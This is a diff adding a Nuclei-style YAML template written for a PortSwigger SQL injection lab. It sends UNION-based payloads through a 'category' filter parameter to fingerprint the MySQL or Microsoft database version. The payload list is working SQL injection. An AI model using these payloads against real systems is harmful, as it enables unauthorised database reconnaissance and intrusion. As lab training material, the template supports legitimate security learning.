@@ -1,0 +1,44 @@
+id: lab-querying-database-version-mysql-microsoft
+
+info:
+  name: lab-querying-database-version-mysql-microsoft
+  author: FIR_UIII
+  severity: high
+  description: SQL injection attack, querying the database type and version on MySQL and Microsoft
+  reference:
+    - https://
+  tags: SQLi,portswigger
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/filter?category=Gifts{{sql_payload}}"
+    payloads:
+      sql_payload:
+        - "%27+ORDER+BY+1%23"
+        - "%27+ORDER+BY+2%23"
+        - "%27+ORDER+BY+3%23"
+        - "%27+UNION+SELECT+%27FOO%27%23"
+        - "%27+UNION+SELECT+%27FOO%27,%27BAZ%27%23"
+        - "%27+UNION+SELECT+%27FOO%27,%27BAZ%27,%27ZZZ%27%23"
+        - "%27+UNION+SELECT+%40%40version%23"
+        - "%27+UNION+SELECT+%40%40version,%27BAZ%27%23"
+        - "%27+UNION+SELECT+%27FOO%27,%40%40version%23"
+        - "%27+UNION+SELECT+%27FOO%27,,%27BAZ%27,%40%40version%23"
+    
+    stop-at-first-match: true
+    
+    matchers-condition: and
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - Congratulations, you solved the lab!
+          - 8.0.39-0ubuntu0.20.04.1
+          - 8.0.
+        condition: or
+
+      - type: status
+        status:
+          - 200
